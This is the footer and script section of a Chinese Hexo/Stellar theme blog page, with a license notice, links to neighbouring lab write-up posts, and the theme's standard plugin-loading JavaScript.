+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/03/%E9%9D%B6%E6%9C%BA/THM_HackPark/">Try Hack Me-HackPark</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/03/%E9%9D%B6%E6%9C%BA/THM_Daily%20Bugle/">Daily Bugle</a></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
